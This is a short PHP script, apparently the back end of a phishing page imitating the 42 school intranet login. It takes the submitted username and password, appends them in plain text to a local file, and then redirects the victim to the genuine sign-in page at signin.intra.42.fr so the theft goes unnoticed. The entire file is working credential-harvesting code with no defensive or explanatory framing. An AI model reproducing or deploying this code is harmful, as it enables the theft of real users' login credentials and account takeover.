<?php

file_put_contents("../../../datas/intra42.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://signin.intra.42.fr/users/sign_in');
exit();
